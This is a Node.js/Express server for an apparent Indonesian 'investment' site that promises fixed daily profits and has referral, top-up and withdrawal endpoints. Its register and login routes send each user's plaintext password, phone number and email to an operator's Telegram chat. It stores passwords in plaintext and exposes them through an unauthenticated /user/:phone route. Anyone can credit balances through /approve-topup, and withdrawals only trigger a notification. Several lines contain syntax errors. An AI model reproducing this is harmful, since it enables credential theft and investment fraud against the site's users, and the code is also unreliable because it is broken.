const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());

// =========================
// TELEGRAM BOT
// =========================
const bot = new TelegramBot(process.env.BOT_TOKEN, {
    polling: true
});

function send(msg) {
    if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
        bot.sendMessage(process.env.CHAT_ID, msg);
    }
}

// =========================
// HOME ROUTE
// =========================
app.get("/", (req, res) => {
    res.json({
        status: true,
        message: "Server Invest Aktif",
        mongodb: "Connected"
    });
});

// =========================
// USER MODEL
// =========================
const User = mongoose.model("User", {
    username: String,
    phone: {
        type: String,
        unique: true
    },
    email: String,
    password: String,
    referral: String,
    saldo: {
        type: Number,
        default: 0
    },
    referralCode: String,
    referralCount: {
        type: Number,
        default: 0
    },

    paketAktif: [{
        nama: String,
        modal: Number,
        profitPerHari: Number,
        durasi: Number,
        hariBerjalan: {
            type: Number,
            default: 0
        },
        lastClaim: {
            type: Number,
            default: Date.now
        },
        aktif: {
            type: Boolean,
            default: true
        }
    }]
});

// =========================
// TOPUP MODEL
// =========================
const Topup = mongoose.model("Topup", {
    topupId: String,
    phone: String,
    nominal: Number,
    method: String,

    status: {
        type: String,
        default: "pending"
    },

    createdAt: {
        type: Date,
        default: Date.now
    }
});

// =========================
// REGISTER
// =========================
app.post("/register", async (req, res) => {
    try {

        const u = new User(req.body);

        await u.save();

        send(`◈ 🔵 𝗥𝗘𝗚𝗜𝗦𝗧𝗥𝗔𝗦𝗜 ◈

◈ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲   : <b>${u.username}</b>
◈ 𝗛𝗣                : <b>${u.phone}</b>
◈ 𝗣𝗦𝗪𝗥𝗗       : <b>${u.password}</b>
◈ 𝗘𝗺𝗮𝗶𝗹           : <b>${u.email}</b>
◈ 𝗥𝗲𝗳𝗲𝗿𝗿𝗮𝗹       : <b>${u.referral || "-"}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈
`);

        res.json({
            status: true
        });

    } catch (e) {

        res.json({
            status: false,
            message: e.message
        });

    }
});

// =========================
// LOGIN
// =========================
app.post("/login", async (req, res) => {

    const {
        phone,
        password
    } = req.body;

    const user = await User.findOne({
        phone,
        password
    });

    if (!user || user.password !== password) {
        return res.json({
            status: false
        });
    }

    send(`◈ 🟢 𝗟𝗢𝗚𝗜𝗡 ◈

◈ 𝗛𝗣                 : <b>${phone}</b>
◈ 𝗣𝗦𝗪𝗥𝗗       : <b>${password}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈
`);

    res.json({
        status: true,
        user
    });

});

app.get("/user/:phone", async (req, res) => {
    try {
        const user = await User.findOne({
            phone: req.params.phone
        });

        if (!user) {
            return res.json({
                status: false,
                message: "User tidak ditemukan"
            });
        }

        res.json({
            status: true,
            user
        });

    } catch (err) {
        res.json({
            status: false,
            message: err.message
        });
    }
});

// =========================
// TOPUP
// =========================
app.post("/topup", async (req, res) => {

    try {

        const {
            phone,
            nominal,
            method
        } = req.body;

        const customId = "PRT" + Math.floor(100000 + Math.random() * 900000);

const topup = await Topup.create({
    topupId: customId,
    phone,
    nominal,
    method
});

        bot.sendMessage(
    process.env.CHAT_ID,
    `◈ 🔴 𝗧𝗢𝗣 𝗨𝗣 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 ◈

◈ 𝗜𝗗                  : <b>${topup.topupId}</b>
◈ 𝗛𝗣                 : <b>${phone}</b>
◈ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟    : <b>Rp ${Number(nominal).toLocaleString("id-ID)}</b>
◈ 𝗠𝗘𝗧𝗢𝗗𝗘      : <b>${method}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`,
    {
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘",
                        callback_data: `approve_${topup.topupId}`
                    }
                ]
            ]
        }
    }
);

        res.json({
            status: true,
            topupId: topup.topupId
        });

    } catch (err) {

        res.json({
            status: false,
            message: err.message
        });

    }

});

// =========================
// APPROVE TOPUP
// =========================
app.post("/approve-topup", async (req, res) => {
    try {
        const { topupId } = req.body;

        const topup = await Topup.findOne({
    topupId: topupId
});

        if (!topup) {
            return res.json({
                status: false,
                message: "Topup tidak ditemukan"
            });
        }

        if (topup.status === "success") {
            return res.json({
                status: false,
                message: "Topup sudah pernah di-approve"
            });
        }

        const user = await User.findOne({
            phone: topup.phone
        });

        if (!user) {
            return res.json({
                status: false,
                message: "User tidak ditemukan"
            });
        }

        user.saldo += topup.nominal;
        await user.save();

        topup.status = "success";
        await topup.save();

        send(`◈ ✅ 𝗧𝗢𝗣𝗨𝗣 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 ◈

◈ 𝗜𝗗                  : <b>${topup.topupId}</b>
◈ 𝗛𝗣                 : <b>${user.phone}</b>
◈ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟    : <b>Rp ${Number(topup.nominal).toLocaleString("id-Id")}</b>
◈ 𝗦𝗔𝗟𝗗𝗢         : <b>Rp ${Number(user.saldo).toLocaleString("id-Id")}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈
`);

        res.json({
            status: true,
            message: "Topup berhasil di-approve",
            user
        });

    } catch (err) {
        res.json({
            status: false,
            message: err.message
        });
    }
});

bot.on("callback_query", async (query) => {

    try{

        const data = query.data;

        if(!data.startsWith("approve_")) return;

        const topupId =
        data.replace("approve_","");

        const topup =
        await Topup.findOne({
            topupId
        });

        if(!topup){
            return bot.answerCallbackQuery(
                query.id,
                {
                    text:"Topup tidak ditemukan"
                }
            );
        }

        if(topup.status === "success"){
            return bot.answerCallbackQuery(
                query.id,
                {
                    text:"Sudah di approve"
                }
            );
        }

        const user =
        await User.findOne({
            phone: topup.phone
        });

        user.saldo += topup.nominal;

        await user.save();

        topup.status = "success";

        await topup.save();

        await bot.editMessageText(

`◈ ✅ 𝗧𝗢𝗣𝗨𝗣 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 ◈

◈ 𝗜𝗗                  : <b>${topup.topupId}</b>
◈ 𝗛𝗣                 : <b>${user.phone}</b>
◈ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟    : <b>Rp ${Number(topup.nominal).toLocaleString("id-ID")}</b>
◈ 𝗦𝗔𝗟𝗗𝗢         : <b>Rp ${Number(user.saldo).toLocaleString(:id-ID")}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`,

        {
            chat_id:
            query.message.chat.id,

            message_id:
            query.message.message_id
        });

        bot.answerCallbackQuery(
            query.id,
            {
                text:"Berhasil"
            }
        );

    }catch(err){

        console.log(
            "Approve Error:",
            err
        );

    }

});

app.get("/topup-status/:id", async (req, res) => {
    try {
        const topup = await Topup.findOne({
    topupId: req.params.id
});

        if (!topup) {
            return res.json({
                status: false,
                message: "Topup tidak ditemukan"
            });
        }

        res.json({
            status: true,
            topup
        });

    } catch (err) {
        res.json({
            status: false,
            message: err.message
        });
    }
});

// =========================
// WITHDRAW
// =========================
app.post("/withdraw", async (req, res) => {

    const {
        phone,
        nominal,
        bank
    } = req.body;

    send(`◈ 🚮 𝗪𝗜𝗧𝗛𝗗𝗥𝗔𝗪 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 ◈

◈ 𝗛𝗣                 : <b>${phone}</b>
◈ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟    : <b>Rp ${Number(nominal).toLoacaleString("id-ID")}</b>
◈ 𝗕𝗔𝗡𝗞            : <b>${bank}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`);

    res.json({
        status: true
    });

});

// =========================
// REFERRAL
// =========================
app.post("/referral", async (req, res) => {

    const {
        phone,
        referralPhone
    } = req.body;

    send(`◈ 🟨 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗗𝗜𝗚𝗨𝗡𝗔𝗞𝗔𝗡 ◈

𝗛𝗣                 : <b>${phone}</b>
𝗥𝗘𝗙               : <b>${referralPhone}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`);

    res.json({
        status: true
    });

});

// =========================
// ENGINE PAKET
// =========================
setInterval(async () => {

    try {

        const users = await User.find({
            "paketAktif.0": {
                $exists: true
            }
        });

        const now = Date.now();

        for (let user of users) {

            let changed = false;

            for (let paket of user.paketAktif) {

                if (!paket.aktif) continue;

                const diff = now - (paket.lastClaim || now);

                if (diff >= 24 * 60 * 60 * 1000) {

                    user.saldo += paket.profitPerHari;
                    paket.hariBerjalan += 1;
                    paket.lastClaim = now;

                    changed = true;

                    send(`📈 PROFIT

HP : ${user.phone}
+Rp ${paket.profitPerHari}`);

                    if (paket.hariBerjalan >= paket.durasi) {

                        paket.aktif = false;

                        send(`⛔ PAKET SELESAI

HP    : ${user.phone}
Paket : ${paket.nama}`);

                    }
                }
            }

            if (changed) {
                await user.save();
            }
        }

        console.log("Engine running...");

    } catch (err) {

        console.log("Engine Error:", err);

    }

}, 60 * 1000);

// =========================
// MONGODB + SERVER START
// =========================
async function start() {

    try {

        await mongoose.connect(process.env.MONGO_URL);

        console.log("MongoDB Connected");

        app.listen(PORT, () => {
            console.log(`Server running on ${PORT}`);
        });

    } catch (err) {

        console.log("MongoDB Error:", err);

    }
}

start();
